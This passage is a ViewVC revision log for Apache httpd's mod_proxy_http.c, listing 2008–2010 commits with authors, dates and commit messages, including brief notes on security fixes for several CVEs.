Use APR_STATUS_IS_TIMEUP instead of direct compare to APR_TIMEUP to
be more safe on different platforms.

Note: This commit has an additional, platform-independent change to
mark the back-end connection for closing ("backend->close = 1;").
That code is not required to resolve CVE-2010-2068 on any platform.

PR: 49417
Addresses CVE-2010-2068

```

---

Revision [**951900**](/viewvc?view=revision&revision=951900) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=951900&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=951900&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=951900))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=951900)

Modified
*Sun Jun 6 17:07:12 2010 UTC*
(14 years, 7 months ago)
by *sf*

File length: 81127 byte(s)

Diff to [previous 951895](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=951895&r2=951900)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=951895&r2=951900&diff_format=h))
```
- Be less verbose at levels INFO and DEBUG in mod_proxy* and mod_ssl
- Add some trace logging to core and http

```

---

Revision [**951895**](/viewvc?view=revision&revision=951895) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=951895&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=951895&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=951895))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=951895)

Modified
*Sun Jun 6 16:59:50 2010 UTC*
(14 years, 7 months ago)
by *sf*

File length: 80814 byte(s)

Diff to [previous 921347](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=921347&r2=951895)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=921347&r2=951895&diff_format=h))
```
Use the new APLOG_USE_MODULE/AP_DECLARE_MODULE macros everywhere to take
advantage of per-module loglevels

```

---

Revision [**921347**](/viewvc?view=revision&revision=921347) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=921347&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=921347&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=921347))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=921347)

Modified
*Wed Mar 10 13:37:00 2010 UTC*
(14 years, 10 months ago)
by *sf*

File length: 80832 byte(s)

Diff to [previous 912063](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=912063&r2=921347)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=912063&r2=921347&diff_format=h))
```
log remote server port in various places

```

---

Revision [**912063**](/viewvc?view=revision&revision=912063) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=912063&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=912063&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=912063))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=912063)

Modified
*Sat Feb 20 01:54:15 2010 UTC*
(14 years, 11 months ago)
by *niq*

File length: 80696 byte(s)

Diff to [previous 909899](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=909899&r2=912063)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=909899&r2=912063&diff_format=h))
```
mod_proxy_http: get the headers right in a HEAD request with ProxyErrorOverride.PR 41646
Analysis by Stuart Children; patch by niq

```

---

Revision [**909899**](/viewvc?view=revision&revision=909899) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=909899&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=909899&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=909899))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=909899)

Modified
*Sat Feb 13 20:24:24 2010 UTC*
(14 years, 11 months ago)
by *minfrin*

File length: 80801 byte(s)

Diff to [previous 882269](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=882269&r2=909899)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=882269&r2=909899&diff_format=h))
```
mod_proxy_http: Make sure that when an ErrorDocument is served
from a reverse proxied URL, that the subrequest respects the status
of the original request. This brings the behaviour of proxy_handler
in line with default_handler. PR 47106.

```

---

Revision [**882269**](/viewvc?view=revision&revision=882269) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=882269&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=882269&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=882269))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=882269)

Modified
*Thu Nov 19 20:00:12 2009 UTC*
(15 years, 2 months ago)
by *trawick*

File length: 79804 byte(s)

Diff to [previous 824072](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=824072&r2=882269)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=824072&r2=882269&diff_format=h))
```
fix or complain about some invalid errno references

```

---

Revision [**824072**](/viewvc?view=revision&revision=824072) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=824072&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=824072&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=824072))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=824072)

Modified
*Sun Oct 11 13:38:51 2009 UTC*
(15 years, 3 months ago)
by *sf*

File length: 79801 byte(s)

Diff to [previous 806920](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=806920&r2=824072)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=806920&r2=824072&diff_format=h))
```
Allow ProxyPreserveHost to work in <Proxy> sections

PR: 34901

```

---

Revision [**806920**](/viewvc?view=revision&revision=806920) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=806920&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=806920&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=806920))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=806920)

Modified
*Sun Aug 23 02:00:43 2009 UTC*
(15 years, 5 months ago)
by *niq*

File length: 79705 byte(s)

Diff to [previous 790587](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=790587&r2=806920)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=790587&r2=806920&diff_format=h))
```
Return consistent error status for proxy unable to connect
PR 46971

```

---

Revision [**790587**](/viewvc?view=revision&revision=790587) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=790587&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=790587&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=790587))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=790587)

Modified
*Thu Jul 2 13:41:18 2009 UTC*
(15 years, 6 months ago)
by *jorton*

File length: 79802 byte(s)

Diff to [previous 785661](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=785661&r2=790587)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=785661&r2=790587&diff_format=h))
```
Security fix for CVE-2009-1890:

* modules/proxy/mod_proxy_http.c (stream_reqbody_cl): Specify the base
  passed to apr_strtoff, and validate the Content-Length in the same
  way the HTTP_IN filter does.  If the number of bytes streamed
  exceeds the expected body length, bail out of the loop.

Thanks to: Toadie <toadie643 gmail.com> for reporting and diagnosis of
	this issue.
Submitted by: niq, jorton

```

---

Revision [**785661**](/viewvc?view=revision&revision=785661) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=785661&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=785661&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=785661))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=785661)

Modified
*Wed Jun 17 15:21:21 2009 UTC*
(15 years, 7 months ago)
by *niq*

File length: 79291 byte(s)

Diff to [previous 778531](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=778531&r2=785661)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=778531&r2=785661&diff_format=h))
```
mod_proxy_http: fix case sensitivity checking transfer encoding
PR 47383 [Ryuzo Yamamoto]

```

---

Revision [**778531**](/viewvc?view=revision&revision=778531) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=778531&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=778531&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=778531))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=778531)

Modified
*Mon May 25 23:19:16 2009 UTC*
(15 years, 8 months ago)
by *niq*

File length: 79287 byte(s)

Diff to [previous 760866](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=760866&r2=778531)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=760866&r2=778531&diff_format=h))
```
Fix IPv6 literal addresses passed to a proxied backend.
PR 47177
Patch by Carlos Garcia Braschi

```

---

Revision [**760866**](/viewvc?view=revision&revision=760866) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=760866&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=760866&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=760866))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=760866)

Modified
*Wed Apr 1 12:07:47 2009 UTC*
(15 years, 9 months ago)
by *rpluem*

File length: 78843 byte(s)

Diff to [previous 733219](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=733219&r2=760866)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=733219&r2=760866&diff_format=h))
```
* Add SSLProxyCheckPeerExpire and SSLProxyCheckPeerCN directives to enable
  stricter checking of remote server certificates.

  (docs/manual/mod/mod_ssl.xml)
    Documentation of SSLProxyCheckPeerExpire and SSLProxyCheckPeerCN.

  (modules/proxy/mod_proxy_http.c)
    Set the hostname of the request URL as note on the connection.

  (modules/ssl/ssl_private.h)
    Add proxy_ssl_check_peer_expire and proxy_ssl_check_peer_cn fields to
    the SSLSrvConfigRec.

  (modules/ssl/ssl_engine_config.c)
    Directives stuff for SSLProxyCheckPeerExpire and SSLProxyCheckPeerCN.

  (modules/ssl/ssl_engine_io.c)
    Check whether the remote servers certificate is expired / if there is a
    mismatch between the requested hostanme and the remote server certificates
    CN field.
    Be able to parse ASN1 times.

  (modules/ssl/mod_ssl.c)
    Directives stuff for SSLProxyCheckPeerExpire and SSLProxyCheckPeerCN.

```

---

Revision [**733219**](/viewvc?view=revision&revision=733219) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=733219&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=733219&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=733219))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=733219)

Modified
*Sat Jan 10 01:35:50 2009 UTC*
(16 years ago)
by *covener*

File length: 78506 byte(s)

Diff to [previous 733127](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=733127&r2=733219)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=733127&r2=733219&diff_format=h))
```
use ap_log_rerror instead of r->server per niq's comments

```

---

Revision [**733127**](/viewvc?view=revision&revision=733127) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=733127&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=733127&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=733127))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=733127)

Modified
*Fri Jan 9 19:31:48 2009 UTC*
(16 years ago)
by *covener*

File length: 78520 byte(s)

Diff to [previous 712375](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=712375&r2=733127)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=712375&r2=733127&diff_format=h))
```
pass a server_rec to ap_log_error on two interim response messages

```

---

Revision [**712375**](/viewvc?view=revision&revision=712375) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=712375&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=712375&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=712375))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=712375)

Modified
*Sat Nov 8 11:09:38 2008 UTC*
(16 years, 2 months ago)
by *rpluem*

File length: 78510 byte(s)

Diff to [previous 707163](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=707163&r2=712375)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=707163&r2=712375&diff_format=h))
```
* Rip out the old flushing approach for solving lifetime issues between the
  backend connection bucket allocator and front end connection bucket allocator.
  Instead copy the buckets from the backend over to ones that have been created
  using the front end bucket allocator. For metabucket this is done by recreating
  them, for data buckets this is done by reading them and putting the read data
  in a transient bucket.

PR: 45792

```

---

Revision [**707163**](/viewvc?view=revision&revision=707163) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=707163&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=707163&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=707163))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=707163)

Modified
*Wed Oct 22 19:13:57 2008 UTC*
(16 years, 3 months ago)
by *jim*

File length: 78223 byte(s)

Diff to [previous 697362](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=697362&r2=707163)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=697362&r2=707163&diff_format=h))
```
Remove potential for memory leak... allocate on this
request which is now viable due to connection pooling.

```

---

Revision [**697362**](/viewvc?view=revision&revision=697362) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=697362&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=697362&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=697362))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=697362)

Modified
*Sat Sep 20 13:44:26 2008 UTC*
(16 years, 4 months ago)
by *jim*

File length: 78921 byte(s)

Diff to [previous 685191](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=685191&r2=697362)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=685191&r2=697362&diff_format=h))
```
For timeouts, behave as before and not drop.
From Adam Woodworth <mirkperl gmail.com>

```

---

Revision [**685191**](/viewvc?view=revision&revision=685191) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=685191&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=685191&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=685191))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=685191)

Modified
*Tue Aug 12 15:40:48 2008 UTC*
(16 years, 5 months ago)
by *trawick*

File length: 78578 byte(s)

Diff to [previous 684351](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=684351&r2=685191)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=684351&r2=685191&diff_format=h))
```
comment tweak

```

---

Revision [**684351**](/viewvc?view=revision&revision=684351) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=684351&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=684351&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=684351))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=684351)

Modified
*Sat Aug 9 21:33:09 2008 UTC*
(16 years, 5 months ago)
by *rpluem*

File length: 78579 byte(s)

Diff to [previous 666180](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=666180&r2=684351)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=666180&r2=684351&diff_format=h))
```
* Introduce environment variable proxy-initial-not-pooled to avoid reusing
  pooled connections if the client connection is an initial connection.
  This avoids the "proxy: error reading status line from remote server"
  error caused by the race condition that the backend server closed the
  connection after the connection check on our side and before our data
  reached the backend. Yes, this downgrades performance, especially with
  HTTP/1.0 clients. Hence it is configurable and off by default.

PR: 37770

```

---

Revision [**666180**](/viewvc?view=revision&revision=666180) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=666180&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=666180&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=666180))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=666180)

Modified
*Tue Jun 10 16:14:47 2008 UTC*
(16 years, 7 months ago)
by *jim*

File length: 77989 byte(s)

Diff to [previous 666154](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=666154&r2=666180)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=666154&r2=666180&diff_format=h))
```
move back to inner loop... fails otherwise

```

---

Revision [**666154**](/viewvc?view=revision&revision=666154) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=666154&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=666154&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=666154))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=666154)

Modified
*Tue Jun 10 15:30:00 2008 UTC*
(16 years, 7 months ago)
by *jim*

File length: 77916 byte(s)

Diff to [previous 661508](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=661508&r2=666154)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=661508&r2=666154&diff_format=h))
```
Patch for CVE-2008-2364...

```

---

Revision [**661508**](/viewvc?view=revision&revision=661508) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=661508&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=661508&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=661508))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=661508)

Modified
*Thu May 29 22:23:19 2008 UTC*
(16 years, 8 months ago)
by *rpluem*

File length: 77068 byte(s)

Diff to [previous 661506](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=661506&r2=661508)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=661506&r2=661508&diff_format=h))
```
* Do this later as we might leave the function anyway without the need for this.

```

---

Revision [**661506**](/viewvc?view=revision&revision=661506) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=661506&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=661506&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=661506))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=661506)

Modified
*Thu May 29 22:19:17 2008 UTC*
(16 years, 8 months ago)
by *rpluem*

File length: 77068 byte(s)

Diff to [previous 660726](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=660726&r2=661506)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=660726&r2=661506&diff_format=h))
```
* According to RFC 2616 8.2.3 we are not allowed to forward an
  Expect: 100-continue to an HTTP/1.0 server. Instead we MUST return
  a HTTP_EXPECTATION_FAILED.

```

---

Revision [**660726**](/viewvc?view=revision&revision=660726) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=660726&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=660726&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=660726))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=660726)

Modified
*Tue May 27 21:40:48 2008 UTC*
(16 years, 8 months ago)
by *rpluem*

File length: 76772 byte(s)

Diff to [previous 654978](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=654978&r2=660726)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=654978&r2=660726&diff_format=h))
```
*  mod_proxy_http.c
   Ensure that the EOC bucket is inserted BEFORE an EOS bucket in bb as
   some resource filters like mod_deflate pass everything up to the EOS
   down the chain immediately and sent the remainder of the brigade later
   (or even never). But in this case the ap_http_header_filter does not
   get out of our way soon enough.

   http_filters.c
   Remove all data buckets that are in a brigade after an EOC bucket
   was seen, as an EOC bucket tells us that no (further) resource
   and protocol data should go out to the client. OTOH meta buckets
   are still welcome as they might trigger needed actions down in
   the chain (e.g. in network filters like SSL).
   Remark 1: It is needed to dump ALL data buckets in the brigade
             since an filter in between might have inserted data
             buckets BEFORE the EOC bucket sent by the original
             sender and we do NOT want this data to be sent.
   Remark 2: Dumping all data buckets here does not necessarily mean
             that no further data is send to the client as:
             1. Network filters like SSL can still be triggered via
                meta buckets to talk with the client e.g. for a
                clean shutdown.
             2. There could be still data that was buffered before
                down in the chain that gets flushed by a FLUSH or an
                EOS bucket.

PR: 37770

```

---

Revision [**654978**](/viewvc?view=revision&revision=654978) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=654978&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=654978&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=654978))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=654978)

Modified
*Fri May 9 23:41:10 2008 UTC*
(16 years, 8 months ago)
by *minfrin*

File length: 75917 byte(s)

Diff to [previous 654968](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=654968&r2=654978)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=654968&r2=654978&diff_format=h))
```
Remove extra cruft that ended up in a commit.

```

---

Revision [**654968**](/viewvc?view=revision&revision=654968) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=654968&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=654968&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=654968))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=654968)

Modified
*Fri May 9 22:40:01 2008 UTC*
(16 years, 8 months ago)
by *minfrin*

File length: 76019 byte(s)

Diff to [previous 650026](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=650026&r2=654968)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=650026&r2=654968&diff_format=h))
```
core, mod_proxy: If a kept_body is present, it becomes safe for
subrequests to support message bodies. Make sure that safety
checks within the core and within the proxy are not triggered
when kept_body is present. This makes it possible to embed
proxied POST requests within mod_include.

```

---

Revision [**650026**](/viewvc?view=revision&revision=650026) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=650026&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=650026&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=650026))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=650026)

Modified
*Mon Apr 21 06:50:36 2008 UTC*
(16 years, 9 months ago)
by *jfclere*

File length: 75763 byte(s)

Diff to [previous 649922](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=649922&r2=650026)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=649922&r2=650026&diff_format=h))
```
Typo.

```

---

Revision [**649922**](/viewvc?view=revision&revision=649922) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=649922&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=649922&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=649922))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=649922)

Modified
*Sun Apr 20 14:23:25 2008 UTC*
(16 years, 9 months ago)
by *jim*

File length: 75772 byte(s)

Diff to [previous 649840](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=649840&r2=649922)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=649840&r2=649922&diff_format=h))
```
Set at init time, and combine comments

```

---

Revision [**649840**](/viewvc?view=revision&revision=649840) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=649840&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=649840&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=649840))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=649840)

Modified
*Sat Apr 19 18:48:05 2008 UTC*
(16 years, 9 months ago)
by *rpluem*

File length: 75753 byte(s)

Diff to [previous 649239](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=649239&r2=649840)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=649239&r2=649840&diff_format=h))
```
* Do not add the query string again in the case that we are using the
  unparsed uri.

PR: 44803

```

---

Revision [**649239**](/viewvc?view=revision&revision=649239) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=649239&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=649239&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=649239))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=649239)

Modified
*Thu Apr 17 19:20:16 2008 UTC*
(16 years, 9 months ago)
by *jim*

File length: 76192 byte(s)

Diff to [previous 645813](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=645813&r2=649239)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=645813&r2=649239&diff_format=h))
```
handle ? in cases where nocanon is in effect

```

---

